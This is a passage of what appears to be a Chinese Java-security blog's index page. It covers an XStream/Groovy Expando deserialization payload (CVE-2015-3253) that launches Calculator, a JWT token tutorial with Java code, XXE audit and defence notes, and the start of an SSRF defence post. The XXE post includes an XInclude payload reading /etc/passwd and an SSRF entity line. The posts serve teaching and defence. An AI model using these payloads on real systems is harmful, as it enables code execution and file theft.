</span><br><span class="line">                &lt;string&gt;open&lt;/string&gt; </span><br><span class="line">                &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; </span><br><span class="line">              &lt;/command&gt; </span><br><span class="line">              &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; </span><br><span class="line">            &lt;/owner&gt; </span><br><span class="line">            &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt; </span><br><span class="line">            &lt;directive&gt;0&lt;/directive&gt; </span><br><span class="line">            &lt;parameterTypes/&gt; </span><br><span class="line">            &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt; </span><br><span class="line">            &lt;method&gt;start&lt;/method&gt; </span><br><span class="line">          &lt;/org.codehaus.groovy.runtime.MethodClosure&gt; </span><br><span class="line">        &lt;/entry&gt; </span><br><span class="line">      &lt;/expandoProperties&gt; </span><br><span class="line">    &lt;/groovy.util.Expando&gt; </span><br><span class="line">    &lt;int&gt;1&lt;/int&gt; </span><br><span class="line">  &lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：<br><a class="link" target="_blank" rel="noopener" href="https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/">https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://avfisher.win/archives/tag/groovy">http://avfisher.win/archives/tag/groovy<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Thu Jun 21 2018 21:00:00 GMT+0800">2018-06-21</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Groovy%20Deserialization(groovy.util.Expando)CVE-2015-3253/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E5%9F%BA%E4%BA%8Etoken%E7%9A%84%E8%AE%A4%E8%AF%81/">
+                        基于token的认证
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        0x01 cookie/session说到token就必然绕不开cookie和session。
+cookie：由服务端给客户端颁发的一张通行证，用来验证客户端的身份，本质上是一段在浏览器上以KV形式存储的文本数据，包含了session相关信息。用于解决HTTP协议无状态的问题，所以cookie是一个会话跟踪机制，是有状态的。    
+ session：当客户端请求服务端通过验证后，服务端会生成保存身份认证相关的session数据，并将session相关信息写入cookie返回给客户端，然后客户端将cookie保存到本地。之后两端就通过核对session信息来确认可信状态。session 可能会存储在内存、磁盘、数据库里，可能需要在服务端定期的去清理过期的 session。
+0x02 token既然有了cookie/session为啥还需要token呢    
+优点：
+1、无状态、可扩展
+2、安全性
+3、可扩展性
+4、多平台跨域/单点登陆
+5、基于标准
+6、缓解服务器内存压力/增大服务器计算压力
+格式：
+UID + TIME + SIGN [+ OTHER]
+0x03 实施JSON Web Tokens（JWT）
+组成：
+
+header
+
+用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等
+1234&#123;  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;HS256&quot;&#125;
+
+base64一下
+ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9
+
+payload
+
+标准文档：https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1
+可以在其中添加这些字段
+1234567iss：Issuer，发行者sub：Subject，主题aud：Audience，观众exp：Expiration time，过期时间nbf：Not beforeiat：Issued at，发行时间jti：JWT ID
+
+12345Map&lt;String , Object&gt; payload=new HashMap&lt;String, Object&gt;();Date date=new Date();payload.put(&quot;uid&quot;, &quot;007&quot;);payload.put(&quot;iat&quot;, date.getTime());payload.put(&quot;ext&quot;,date.getTime()+1000*60*60);
+
+上边代码中添加的字段如下
+12345&#123;    &quot;iat&quot;: 当前时间,    &quot;exp&quot;: 过期时间,    &quot;uid&quot;: &quot;007&quot;&#125;
+
+base64编码
+ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==
+这样payload就生成好了
+
+signature
+
+将header和payload生成的base64编码通过.连接起来，如下
+ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==
+然后再定义一个secret，如下
+secret
+通过header中定义的HS256算法以secret为密钥进行加密得到signature
+81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb
+此时JWT就生成了，base64(header).base64(payload) .signature
+像这样ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==.81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb
+当然这种方式不能在token中携带敏感信息，例如密码
+0x04 应用
+单点登陆
+
+Set-Cookie: jwt=yyy.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com 
+
+API 调用/授权
+
+https://api.weixin.qq.com/cgi-bin/component/api_query_auth?component_access_token=xxxx
+
+支付验证（一次性）
+
+串行服务调用
+  一次性有效，再次生成token时以用户账户和第一次token为key，update该记录来判断
+
+敏感接口多次调用
+
+
+0x05 代码生成代码
+12345678910111213141516171819202122private static final JWSHeader header=new JWSHeader(JWSAlgorithm.HS256, JOSEObjectType.JWT, null, null, null, null, null, null, null, null, null, null, null);    	/**	 * 生成token，该方法只在用户登录成功后调用	 * 	 * @param Map集合，可以存储用户id，token生成时间，token过期时间等自定义字段	 * @return token字符串,若失败则返回null	 */	public static String createToken(Map&lt;String, Object&gt; payload) &#123;		String tokenString=null;		// 创建一个 JWS object		JWSObject jwsObject = new JWSObject(header, new Payload(new JSONObject(payload)));		try &#123;			// 将jwsObject 进行HMAC签名			jwsObject.sign(new MACSigner(SECRET));			tokenString=jwsObject.serialize();		&#125; catch (JOSEException e) &#123;			System.err.println(&quot;签名失败:&quot; + e.getMessage());			e.printStackTrace();		&#125;		return tokenString;	&#125;
+
+校验代码
+123456789101112131415161718192021222324252627282930313233public static Map&lt;String, Object&gt; validToken(String token) &#123;		Map&lt;String, Object&gt; resultMap = new HashMap&lt;String, Object&gt;();		try &#123;			JWSObject jwsObject = JWSObject.parse(token);			Payload payload = jwsObject.getPayload();			JWSVerifier verifier = new MACVerifier(SECRET);			if (jwsObject.verify(verifier)) &#123;				JSONObject jsonOBj = payload.toJSONObject();				// token校验成功（此时没有校验是否过期）				resultMap.put(&quot;state&quot;, TokenState.VALID.toString());				// 若payload包含ext字段，则校验是否过期				if (jsonOBj.containsKey(&quot;ext&quot;)) &#123;					long extTime = Long.valueOf(jsonOBj.get(&quot;ext&quot;).toString());					long curTime = new Date().getTime();					// 过期了					if (curTime &gt; extTime) &#123;						resultMap.clear();						resultMap.put(&quot;state&quot;, TokenState.EXPIRED.toString());					&#125;				&#125;				resultMap.put(&quot;data&quot;, jsonOBj);			&#125; else &#123;				// 校验失败				resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());			&#125;		&#125; catch (Exception e) &#123;			//e.printStackTrace();			// token格式不合法导致的异常			resultMap.clear();			resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());		&#125;		return resultMap;	&#125;	
+
+
+
+参考：http://blog.leapoahead.com/2015/09/06/understanding-jwt/https://github.com/bigmeow/JWT
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h4 id="0x01-cookie-session"><a href="#0x01-cookie-session" class="headerlink" title="0x01 cookie/session"></a>0x01 cookie/session</h4><p>说到token就必然绕不开cookie和session。</p>
+<p><strong>cookie</strong>：由服务端给客户端颁发的一张通行证，用来验证客户端的身份，本质上是一段在浏览器上以KV形式存储的文本数据，包含了session相关信息。用于解决HTTP协议无状态的问题，所以cookie是一个会话跟踪机制，是有状态的。    </p>
+<p> <strong>session</strong>：当客户端请求服务端通过验证后，服务端会生成保存身份认证相关的session数据，并将session相关信息写入cookie返回给客户端，然后客户端将cookie保存到本地。之后两端就通过核对session信息来确认可信状态。session 可能会存储在内存、磁盘、数据库里，可能需要在服务端定期的去清理过期的 session。</p>
+<h4 id="0x02-token"><a href="#0x02-token" class="headerlink" title="0x02 token"></a>0x02 token</h4><p>既然有了cookie/session为啥还需要token呢    </p>
+<p><strong>优点</strong>：</p>
+<p>1、无状态、可扩展</p>
+<p>2、安全性</p>
+<p>3、可扩展性</p>
+<p>4、多平台跨域/单点登陆</p>
+<p>5、基于标准</p>
+<p>6、缓解服务器内存压力/增大服务器计算压力</p>
+<p><strong>格式</strong>：</p>
+<p><code>UID + TIME + SIGN [+ OTHER]</code></p>
+<h4 id="0x03-实施"><a href="#0x03-实施" class="headerlink" title="0x03 实施"></a>0x03 实施</h4><p><code>JSON Web Tokens（JWT）</code></p>
+<p><strong>组成</strong>：</p>
+<ul>
+<li>header</li>
+</ul>
+<p>用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>base64一下</p>
+<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9</code></p>
+<ul>
+<li>payload</li>
+</ul>
+<p>标准文档：<a class="link" target="_blank" rel="noopener" href="https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1">https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32#section-4.1<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以在其中添加这些字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss：Issuer，发行者</span><br><span class="line">sub：Subject，主题</span><br><span class="line">aud：Audience，观众</span><br><span class="line">exp：Expiration time，过期时间</span><br><span class="line">nbf：Not before</span><br><span class="line">iat：Issued at，发行时间</span><br><span class="line">jti：JWT ID</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String , Object&gt; payload=<span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">Date date=<span class="keyword">new</span> Date();</span><br><span class="line">payload.put(<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;007&quot;</span>);</span><br><span class="line">payload.put(<span class="string">&quot;iat&quot;</span>, date.getTime());</span><br><span class="line">payload.put(<span class="string">&quot;ext&quot;</span>,date.getTime()+<span class="number">1000</span>*<span class="number">60</span>*<span class="number">60</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上边代码中添加的字段如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;iat&quot;</span>: 当前时间,</span><br><span class="line">    <span class="attr">&quot;exp&quot;</span>: 过期时间,</span><br><span class="line">    <span class="attr">&quot;uid&quot;</span>: <span class="string">&quot;007&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>base64编码</p>
+<p><code>ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>
+<p>这样payload就生成好了</p>
+<ul>
+<li>signature</li>
+</ul>
+<p>将header和payload生成的base64编码通过<code>.</code>连接起来，如下</p>
+<p><code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==</code></p>
+<p>然后再定义一个secret，如下</p>
+<p><code>secret</code></p>
+<p>通过header中定义的HS256算法以secret为密钥进行加密得到signature</p>
+<p><code>81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>
+<p>此时JWT就生成了，base64(header).base64(payload) .signature</p>
+<p>像这样<code>ewogICJ0eXAiOiAidG9rZW7nsbvlnosiLAogICJhbGciOiAi562+5ZCN566X5rOVIgp9.ewogICAgImlhdCI6IOW9k+WJjeaXtumXtCwKICAgICJleHAiOiDov4fmnJ/ml7bpl7QsCiAgICAidWlkIjogIjAwNyIKfQ==.81faa5ef7b7596783cb3ed2f75618def367a9b7f8490047cb12880d895b794eb</code></p>
+<p>当然这种方式不能在token中携带敏感信息，例如密码</p>
+<h4 id="0x04-应用"><a href="#0x04-应用" class="headerlink" title="0x04 应用"></a>0x04 应用</h4><ul>
+<li>单点登陆</li>
+</ul>
+<p><code>Set-Cookie: jwt=yyy.zzz.xxx; HttpOnly; max-age=980000; domain=.taobao.com </code></p>
+<ul>
+<li>API 调用/授权</li>
+</ul>
+<p><code>https://api.weixin.qq.com/cgi-bin/component/api_query_auth?component_access_token=xxxx</code></p>
+<ul>
+<li><p>支付验证（一次性）</p>
+</li>
+<li><p>串行服务调用</p>
+<p>  一次性有效，再次生成token时以用户账户和第一次token为key，update该记录来判断</p>
+</li>
+<li><p>敏感接口多次调用</p>
+</li>
+</ul>
+<h4 id="0x05-代码"><a href="#0x05-代码" class="headerlink" title="0x05 代码"></a>0x05 代码</h4><p><strong>生成代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private static final JWSHeader header=new JWSHeader(JWSAlgorithm.HS256, JOSEObjectType.JWT, null, null, null, null, null, null, null, null, null, null, null);</span><br><span class="line">    </span><br><span class="line">	/**</span><br><span class="line">	 * 生成token，该方法只在用户登录成功后调用</span><br><span class="line">	 * </span><br><span class="line">	 * @param Map集合，可以存储用户id，token生成时间，token过期时间等自定义字段</span><br><span class="line">	 * @return token字符串,若失败则返回null</span><br><span class="line">	 */</span><br><span class="line">	public static String createToken(Map&lt;String, Object&gt; payload) &#123;</span><br><span class="line">		String tokenString=null;</span><br><span class="line">		// 创建一个 JWS object</span><br><span class="line">		JWSObject jwsObject = new JWSObject(header, new Payload(new JSONObject(payload)));</span><br><span class="line">		try &#123;</span><br><span class="line">			// 将jwsObject 进行HMAC签名</span><br><span class="line">			jwsObject.sign(new MACSigner(SECRET));</span><br><span class="line">			tokenString=jwsObject.serialize();</span><br><span class="line">		&#125; catch (JOSEException e) &#123;</span><br><span class="line">			System.err.println(&quot;签名失败:&quot; + e.getMessage());</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		return tokenString;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>校验代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static Map&lt;String, Object&gt; validToken(String token) &#123;</span><br><span class="line">		Map&lt;String, Object&gt; resultMap = new HashMap&lt;String, Object&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			JWSObject jwsObject = JWSObject.parse(token);</span><br><span class="line">			Payload payload = jwsObject.getPayload();</span><br><span class="line">			JWSVerifier verifier = new MACVerifier(SECRET);</span><br><span class="line">			if (jwsObject.verify(verifier)) &#123;</span><br><span class="line">				JSONObject jsonOBj = payload.toJSONObject();</span><br><span class="line">				// token校验成功（此时没有校验是否过期）</span><br><span class="line">				resultMap.put(&quot;state&quot;, TokenState.VALID.toString());</span><br><span class="line">				// 若payload包含ext字段，则校验是否过期</span><br><span class="line">				if (jsonOBj.containsKey(&quot;ext&quot;)) &#123;</span><br><span class="line">					long extTime = Long.valueOf(jsonOBj.get(&quot;ext&quot;).toString());</span><br><span class="line">					long curTime = new Date().getTime();</span><br><span class="line">					// 过期了</span><br><span class="line">					if (curTime &gt; extTime) &#123;</span><br><span class="line">						resultMap.clear();</span><br><span class="line">						resultMap.put(&quot;state&quot;, TokenState.EXPIRED.toString());</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				resultMap.put(&quot;data&quot;, jsonOBj);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				// 校验失败</span><br><span class="line">				resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			//e.printStackTrace();</span><br><span class="line">			// token格式不合法导致的异常</span><br><span class="line">			resultMap.clear();</span><br><span class="line">			resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());</span><br><span class="line">		&#125;</span><br><span class="line">		return resultMap;</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：<br><a class="link" target="_blank" rel="noopener" href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/bigmeow/JWT">https://github.com/bigmeow/JWT<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri May 18 2018 21:00:00 GMT+0800">2018-05-18</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/DEV/">DEV</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E5%9F%BA%E4%BA%8Etoken%E7%9A%84%E8%AE%A4%E8%AF%81/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/XXE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/">
+                        XXE代码审计和防御策略 for Java
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        1、Java代码中的XXE触发点XXE的产生需要满足：1. 接收外部传入的XML格式，2.未禁用外部实体。
+123456789101112131415161718JAXP DocumentBuilderFactory, SAXParserFactory and DOM4JXMLInputFactory (a StAX parser)Oracle DOM ParserTransformerFactoryValidatorSchemaFactorySAXTransformerFactoryXMLReaderSAXReaderSAXBuilderNo-op EntityResolverJAXB UnmarshallerXPathExpressionjava.beans.XMLDecoderOther XML ParsersSpring Framework MVC/OXM XXE VulnerabilitiesCastor……..
+
+https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+XXE&amp;SSRF1&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://internal.vulnerable-website.com/&quot;&gt; ]&gt;
+
+XInclude攻击12&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
+
+
+
+2、如何防御XXE攻击2.1 禁用外部实体解析例如SAXReader
+123saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+
+更多参考：https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+2.2 升级到安全版本Apache POI &gt;= 4.1.1
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="1、Java代码中的XXE触发点"><a href="#1、Java代码中的XXE触发点" class="headerlink" title="1、Java代码中的XXE触发点"></a>1、Java代码中的XXE触发点</h2><p>XXE的产生需要满足：1. 接收外部传入的XML格式，2.未禁用外部实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J</span><br><span class="line">XMLInputFactory (a StAX parser)</span><br><span class="line">Oracle DOM Parser</span><br><span class="line">TransformerFactory</span><br><span class="line">Validator</span><br><span class="line">SchemaFactory</span><br><span class="line">SAXTransformerFactory</span><br><span class="line">XMLReader</span><br><span class="line">SAXReader</span><br><span class="line">SAXBuilder</span><br><span class="line">No-op EntityResolver</span><br><span class="line">JAXB Unmarshaller</span><br><span class="line">XPathExpression</span><br><span class="line">java.beans.XMLDecoder</span><br><span class="line">Other XML Parsers</span><br><span class="line">Spring Framework MVC/OXM XXE Vulnerabilities</span><br><span class="line">Castor</span><br><span class="line">……..</span><br></pre></td></tr></table></figure>
+
+<p><a class="link" target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="XXE-amp-SSRF"><a href="#XXE-amp-SSRF" class="headerlink" title="XXE&amp;SSRF"></a>XXE&amp;SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://internal.vulnerable-website.com/&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XInclude攻击"><a href="#XInclude攻击" class="headerlink" title="XInclude攻击"></a>XInclude攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、如何防御XXE攻击"><a href="#2、如何防御XXE攻击" class="headerlink" title="2、如何防御XXE攻击"></a>2、如何防御XXE攻击</h2><h3 id="2-1-禁用外部实体解析"><a href="#2-1-禁用外部实体解析" class="headerlink" title="2.1 禁用外部实体解析"></a>2.1 禁用外部实体解析</h3><p>例如SAXReader</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>
+
+<p>更多参考：<a class="link" target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="2-2-升级到安全版本"><a href="#2-2-升级到安全版本" class="headerlink" title="2.2 升级到安全版本"></a>2.2 升级到安全版本</h3><p>Apache POI &gt;= 4.1.1</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed May 16 2018 21:00:00 GMT+0800">2018-05-16</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/XXE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/SSRF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/">
+                        SSRF代码审计和防御策略 for Java
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        1、Java代码中的SSRF触发点SSRF的产生需要满足两个点：1. 接收外部传入的地址，2.发送请求。
+URLHttpClientHttpURLConnectionImageIODriverManagerSocketOkHttpClient……
+2、如何防御SSRF攻击2.1 白名单判断123456789101112131415161718192021222324252627public class SSRFWhiteChecker extends WhiteChecker &#123;    private static SSRFWhiteChecker instance = null;    public SSRFWhiteChecker()&#123;    &#125;    public static SSRFWhiteChecker getInstance() &#123;        if (null == instance) &#123;            synchronized (SSRFWhiteChecker.class) &#123;                if (null == instance) &#123;                    instance = new SSRFWhiteChecker();                &#125;            &#125;        &#125;        return instance;    &#125;    /**     * @Description: 校验url是否在白名单内     * @Param: url 网络地址     * @return: boolean true 在白名单内；false 不在白名单内     */    public boolean verifyURL(String url)&#123;        return super.verifyURL(url);    &#125;&#125;
+
+2.2 防止重定向绕过对每次跳转都进行判断
+
+2.3 利用NetHooks实现TCP请求前置判断通过sun.net.NetHooks实现拦截TCP请求，进行host判断。
+
+该类的方法如下
